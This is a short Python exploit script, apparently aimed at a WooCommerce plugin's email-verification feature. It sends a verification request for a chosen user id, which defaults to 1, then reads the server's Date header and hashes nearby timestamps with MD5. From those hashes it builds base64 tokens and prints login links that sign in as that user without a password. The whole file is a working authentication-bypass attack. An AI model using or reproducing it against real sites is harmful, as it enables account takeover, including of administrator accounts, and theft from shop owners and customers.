
import requests, sys, hashlib
import argparse
import datetime
import email.utils
import calendar
import base64

B = "\033[94m"
W = "\033[97m"
R = "\033[91m"
RST = "\033[0;0m"

parser = argparse.ArgumentParser()
parser.add_argument("url", help="the base url")
parser.add_argument('id', type=int, help='the user id', default=1)
args = parser.parse_args()
id = str(args.id)
url = args.url
if args.url[-1] != "/":  # URL needs trailing /
    url = url + "/"

verify_url = url + "?wcj_user_id=" + id
r = requests.get(verify_url)

if r.status_code != 200:
    print("status code != 200")
    print(r.headers)
    sys.exit(-1)


def email_time_to_timestamp(s):
    tt = email.utils.parsedate_tz(s)
    if tt is None: return None
    return calendar.timegm(tt) - tt[9]


date = r.headers["Date"]
unix = email_time_to_timestamp(date)


def printBanner():
    print(f"{W}Timestamp: {B}" + date)
    print(f"{W}Timestamp (unix): {B}" + str(unix) + f"{W}\n")
    print("We need to generate multiple timestamps in order to avoid delay related timing errors")
    print("One of the following links will log you in...\n")


printBanner()

for i in range(
        3):  # We need to try multiple timestamps as we don't get the exact hash time and need to avoid delay related timing errors
    hash = hashlib.md5(str(unix - i).encode()).hexdigest()
    print(f"{W}#" + str(i) + f" link for hash {R}" + hash + f"{W}:")
    token = '{"id":"' + id + '","code":"' + hash + '"}'
    token = base64.b64encode(token.encode()).decode()
    token = token.rstrip("=")  # remove trailing =
    link = url + "my-account/?wcj_verify_email=" + token
    print(link + f"\n{RST}")